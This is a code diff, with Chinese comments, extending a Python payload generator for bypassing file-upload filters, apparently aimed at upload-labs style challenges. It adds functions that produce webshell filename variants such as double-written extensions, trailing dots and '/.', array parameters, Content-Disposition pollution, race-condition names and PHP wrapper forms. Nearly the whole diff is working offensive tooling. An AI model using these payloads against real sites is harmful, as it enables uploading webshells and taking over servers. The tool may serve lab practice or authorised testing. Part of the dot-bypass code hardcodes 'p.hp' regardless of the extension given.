@@ -224,6 +224,55 @@ class BypassPayloadGenerator:
                 'severity': '中',
                 'generator': self._backup_bypass
             },
+            # 31. 双写绕过增强 (Pass-10)
+            'double_write_bypass': {
+                'name': '双写绕过增强',
+                'description': '双写扩展名字符绕过str_ireplace替换',
+                'severity': '高',
+                'generator': self._double_write_bypass
+            },
+            # 32. 条件竞争 (Pass-18)
+            'race_condition': {
+                'name': '条件竞争',
+                'description': '利用上传验证时间差进行竞争',
+                'severity': '高',
+                'generator': self._race_condition
+            },
+            # 33. 数组绕过 (Pass-20/21)
+            'array_bypass': {
+                'name': '数组绕过',
+                'description': 'PHP数组形式绕过end()/explode()验证',
+                'severity': '高',
+                'generator': self._array_bypass
+            },
+            # 34. Content-Disposition污染
+            'content_disposition_pollution': {
+                'name': 'Content-Disposition污染',
+                'description': '多个filename参数、未闭合引号等',
+                'severity': '高',
+                'generator': self._content_disposition_pollution
+            },
+            # 35. move_uploaded_file特性 (Pass-19)
+            'move_uploaded_file_bypass': {
+                'name': 'move_uploaded_file特性',
+                'description': '利用move_uploaded_file忽略末尾/.',
+                'severity': '高',
+                'generator': self._move_uploaded_file_bypass
+            },
+            # 36. 双点Payload (shell..php)
+            'double_dot_bypass': {
+                'name': '双点Payload',
+                'description': '文件名中插入多点字符',
+                'severity': '中',
+                'generator': self._double_dot_bypass
+            },
+            # 37. PHP伪协议
+            'php_wrapper_bypass': {
+                'name': 'PHP伪协议',
+                'description': '使用php://filter、phar://等协议',
+                'severity': '高',
+                'generator': self._php_wrapper_bypass
+            },
         }
     
     def _case_bypass(self, filename: str, ext: str) -> List[str]:
@@ -352,16 +401,43 @@ class BypassPayloadGenerator:
         ]
     
     def _dot_bypass(self, filename: str, ext: str) -> List[str]:
-        """点绕过"""
-        return [
-            f"{filename}{ext}.",
-            f"{filename}{ext}..",
-            f"{filename}{ext}...",
-            f"{filename}{ext}....",
-            f"{filename}{ext}.....",
-            f"{filename}.{ext[1:]}",
-            f"{filename}..{ext[1:]}",
+        """点绕过 - 增强版
+        
+        在文件名不同位置插入点字符
+        支持双点Payload (shell..php)
+        """
+        base_ext = ext[1:] if ext.startswith('.') else ext
+        results = []
+        
+        # 扩展名后多点
+        results = [
+            f"{filename}{ext}.",                # shell.php.
+            f"{filename}{ext}..",               # shell.php..
+            f"{filename}{ext}...",              # shell.php...
+            f"{filename}{ext}....",             # shell.php....
+            f"{filename}{ext}.....",            # shell.php.....
         ]
+        
+        # 扩展名前多点 (双点payload)
+        results.extend([
+            f"{filename}..{base_ext}",          # shell..php
+            f"{filename}...{base_ext}",         # shell...php
+            f"{filename}....{base_ext}",        # shell....php
+        ])
+        
+        # 扩展名中间插点
+        if len(base_ext) >= 2:
+            mid = len(base_ext) // 2
+            results.extend([
+                f"{filename}.p.hp",             # shell.p.hp
+                f"{filename}.ph.p",             # shell.ph.p
+                f"{filename}.p..hp",            # shell.p..hp
+            ])
+        
+        # 单点开头
+        results.append(f"{filename}.{base_ext}")
+        
+        return results
     
     def _space_bypass(self, filename: str, ext: str) -> List[str]:
         """空格绕过"""
@@ -586,6 +662,206 @@ class BypassPayloadGenerator:
             f"{filename}.swp",
             f"{filename}~",
         ]
+    
+    def _double_write_bypass(self, filename: str, ext: str) -> List[str]:
+        """双写绕过增强 - Pass-10
+        
+        针对使用 str_ireplace() 简单替换黑名单的情况
+        例如: pphphp -> 替换php后变成php
+        """
+        base_ext = ext[1:] if ext.startswith('.') else ext
+        results = []
+        
+        # PHP 双写变体
+        if base_ext.lower() == 'php':
+            results = [
+                f"{filename}.pphphp",      # pphphp -> php
+                f"{filename}.phphpp",      # phphpp -> php  
+                f"{filename}.pphp",        # pphp -> hp (可能不完整)
+                f"{filename}.phpphp",      # phpphp -> php
+                f"{filename}.p.php",       # p.php -> php (中间加点)
+                f"{filename}.ph.p",        # ph.p -> 可能被解析
+            ]
+        # ASP 双写变体
+        elif base_ext.lower() == 'asp':
+            results = [
+                f"{filename}.aspasp",      # aspasp -> asp
+                f"{filename}.aasps",       # aasps -> asp
+                f"{filename}.aspas",       # aspas -> asp
+                f"{filename}.as.asp",      # as.asp -> asp
+            ]
+        # ASPX 双写变体
+        elif base_ext.lower() == 'aspx':
+            results = [
+                f"{filename}.aspxaspx",    # aspxaspx -> aspx
+                f"{filename}.aaspxspx",    # aaspxspx -> aspx
+                f"{filename}.aspxas",      # aspxas -> aspx
+            ]
+        # JSP 双写变体
+        elif base_ext.lower() == 'jsp':
+            results = [
+                f"{filename}.jspjsp",      # jspjsp -> jsp
+                f"{filename}.jjsps",       # jjsps -> jsp
+                f"{filename}.jspj",        # jspj -> sp (可能)
+            ]
+        
+        return results
+    
+    def _race_condition(self, filename: str, ext: str) -> List[str]:
+        """条件竞争 - Pass-18
+        
+        生成适合条件竞争测试的payload
+        需要:
+        1. 简单的webshell内容
+        2. 短文件名便于快速访问
+        3. 返回payload内容和并发测试说明
+        """
+        base_ext = ext[1:] if ext.startswith('.') else ext
+        results = []
+        
+        # 简单的PHP webshell (最小化便于快速访问)
+        # 使用最短的webshell代码
+        results = [
+            f"{filename}.{base_ext}",           # 基础文件名
+            f"{filename}1.{base_ext}",          # 变体1
+            f"{filename}2.{base_ext}",          # 变体2
+            f"a.{base_ext}",                    # 超短文件名
+            f"x.{base_ext}",                    # 超短文件名
+        ]
+        
+        return results
+    
+    def _array_bypass(self, filename: str, ext: str) -> List[str]:
+        """数组绕过 - Pass-20/21
+        
+        针对使用 end()/explode() 验证扩展名的情况
+        通过数组形式传递文件名绕过
+        
+        注意: 这里的payload格式需要配合表单参数修改
+        例如: save_name[]=shell.php 或 save_name[0]=shell&save_name[1]=php
+        """
+        base_ext = ext[1:] if ext.startswith('.') else ext
+        results = []
+        
+        # 数组形式的文件名 (需要在请求中修改参数格式)
+        # save_name[]=shell.php  -> end()获取最后一个元素
+        # save_name[0]=shell.jpg&save_name[1]=php -> end()返回php
+        
+        # 返回文件名变体 (实际使用需要修改请求参数)
+        results = [
+            f"{filename}.{base_ext}",           # 基础形式
+            f"{filename}.jpg.{base_ext}",       # 双扩展名形式
+            f"{filename}.png.{base_ext}",       # 双扩展名形式
+        ]
+        
+        return results
+    
+    def _content_disposition_pollution(self, filename: str, ext: str) -> List[str]:
+        """Content-Disposition污染
+        
+        通过修改Content-Disposition头部绕过解析
+        包括: 多filename参数、未闭合引号、多等号等
+        """
+        base_ext = ext[1:] if ext.startswith('.') else ext
+        results = []
+        
+        # 这些payload格式需要在请求头中修改
+        # 这里返回文件名变体，实际使用需要构造完整的Content-Disposition
+        
+        # 多filename参数
+        results.extend([
+            f"{filename}.{base_ext}",           # 第一个filename
+            f"safe.jpg",                        # 第二个filename (伪装)
+        ])
+        
+        # 未闭合引号文件名
+        results.extend([
+            f'{filename}.{base_ext}"',          # 末尾引号
+            f'{filename}.{base_ext}\'',         # 单引号
+        ])
+        
+        # 特殊字符
+        results.extend([
+            f'{filename}.{base_ext}.',          # 末尾点
+            f'{filename}.{base_ext} ',          # 末尾空格
+        ])
+        
+        return results
+    
+    def _move_uploaded_file_bypass(self, filename: str, ext: str) -> List[str]:
+        """move_uploaded_file特性绕过 - Pass-19
+        
+        利用move_uploaded_file()函数的特性:
+        - 忽略文件名末尾的 /.
+        - 忽略文件名末尾的多个点
+        """
+        base_ext = ext[1:] if ext.startswith('.') else ext
+        results = []
+        
+        # move_uploaded_file 忽略末尾 /.
+        results = [
+            f"{filename}.{base_ext}/.",         # 末尾 /.
+            f"{filename}.{base_ext}\\.",        # 末尾 \. (Windows)
+            f"{filename}.{base_ext}./",         # 末尾 ./
+            f"{filename}.{base_ext}.\\",        # 末尾 .\\
+            f"{filename}.{base_ext}/./",        # 末尾 /./
+        ]
+        
+        return results
+    
+    def _double_dot_bypass(self, filename: str, ext: str) -> List[str]:
+        """双点Payload - shell..php等格式
+        
+        在文件名不同位置插入多个点字符
+        """
+        base_ext = ext[1:] if ext.startswith('.') else ext
+        results = []
+        
+        # 扩展名前多点
+        results = [
+            f"{filename}..{base_ext}",          # shell..php
+            f"{filename}...{base_ext}",         # shell...php
+            f"{filename}....{base_ext}",        # shell....php
+            f"{filename}.....{base_ext}",       # shell.....php
+        ]
+        
+        # 扩展名中间插点
+        if len(base_ext) >= 2:
+            mid = len(base_ext) // 2
+            results.extend([
+                f"{filename}.{base_ext[:mid]}.{base_ext[mid:]}",   # shell.p.hp
+                f"{filename}.{base_ext[:mid]}..{base_ext[mid:]}",  # shell.p..hp
+                f"{filename}.{base_ext[:mid]}.{base_ext[mid:]}..", # shell.p.hp..
+            ])
+        
+        # 扩展名后多点
+        results.extend([
+            f"{filename}.{base_ext}..",         # shell.php..
+            f"{filename}.{base_ext}...",        # shell.php...
+        ])
+        
+        return results
+    
+    def _php_wrapper_bypass(self, filename: str, ext: str) -> List[str]:
+        """PHP伪协议绕过
+        
+        利用PHP的伪协议特性:
+        - php://filter
+        - phar://
+        - php://input
+        """
+        results = []
+        
+        # 这些通常配合文件包含漏洞使用
+        # 这里返回可能被当作文件名的形式
+        results = [
+            f"{filename}.phar",                 # phar文件
+            f"{filename}.phar.txt",             # 伪装的phar
+            f"php://filter",                    # filter协议
+            f"php://input",                     # input协议
+        ]
+        
+        return results
     
     def generate_all_payloads(self, filename: str = "shell", extension: str = ".php") -> List[Dict]:
         """生成所有绕过payload"""
